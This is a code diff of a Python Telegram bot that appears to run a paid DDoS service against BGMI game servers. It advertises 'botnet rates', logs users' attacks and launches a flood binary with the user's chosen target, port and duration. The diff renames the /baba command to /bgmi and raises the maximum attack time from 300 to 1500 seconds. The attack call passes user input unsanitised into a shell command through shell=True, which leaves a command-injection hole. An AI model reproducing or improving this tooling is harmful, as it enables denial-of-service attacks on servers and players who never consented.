@@ -289,20 +289,20 @@ def start_attack_reply(message, target, port, time):
     response = f"{username}, 𝐀𝐓𝐓𝐀𝐂𝐊 𝐒𝐓𝐀𝐑𝐓𝐄𝐃.🔥🔥\n\n𝐓𝐚𝐫𝐠𝐞𝐭: {target}\n𝐏𝐨𝐫𝐭: {port}\n𝐓𝐢𝐦𝐞: {time} 𝐒𝐞𝐜𝐨𝐧𝐝𝐬\n𝐌𝐞𝐭𝐡𝐨𝐝: SARKARI-BAN"
     bot.reply_to(message, response)
 
-# Dictionary to store the last time each user ran the /baba command
-baba_cooldown = {}
+# Dictionary to store the last time each user ran the /bgmi command
+bgmi_cooldown = {}
 
 COOLDOWN_TIME =0
 
-# Handler for /baba command
+# Handler for /bgmi command
 @bot.message_handler(commands=['baba'])
-def handle_baba(message):
+def handle_bgmi(message):
     user_id = str(message.chat.id)
     if user_id in allowed_user_ids:
         # Check if the user is in admin_id (admins have no cooldown)
         if user_id not in admin_id:
             # Check if the user has run the command before and is still within the cooldown period
-            if user_id in baba_cooldown and (datetime.datetime.now() - baba_cooldown[user_id]).seconds < 10:
+            if user_id in bgmi_cooldown and (datetime.datetime.now() - bgmi_cooldown[user_id]).seconds < 10:
                 response = "You Are On Cooldown ❌. Please Wait 10sec Before Running The /baba Command Again."
                 bot.reply_to(message, response)
                 return
@@ -314,13 +314,13 @@ def handle_baba(message):
             target = command[1]
             port = int(command[2])  # Convert time to integer
             time = int(command[3])  # Convert port to integer
-            if time > 300:
+            if time > 1500:
                 response = "Error: Time interval must be less than 1500."
             else:
-                record_command_logs(user_id, '/baba', target, port, time)
+                record_command_logs(user_id, '/bgmi', target, port, time)
                 log_command(user_id, target, port, time)
                 start_attack_reply(message, target, port, time)  # Call start_attack_reply function
-                full_command = f"./baba {target} {port} {time} 200"
+                full_command = f"./bgmi {target} {port} {time} 200"
                 subprocess.run(full_command, shell=True)
                 response = f"BGMI Attack Finished. Target: {target} Port: {port} Port: {time}"
         else:
@@ -359,7 +359,7 @@ def show_command_logs(message):
 @bot.message_handler(commands=['help'])
 def show_help(message):
     help_text ='''🤖 Available commands:
-💥 /baba : Method For Bgmi Servers. 
+💥 /bgmi : Method For Bgmi Servers. 
 💥 /rules : Please Check Before Use !!.
 💥 /mylogs : To Check Your Recents Attacks.
 💥 /plan : Checkout Our Botnet Rates.
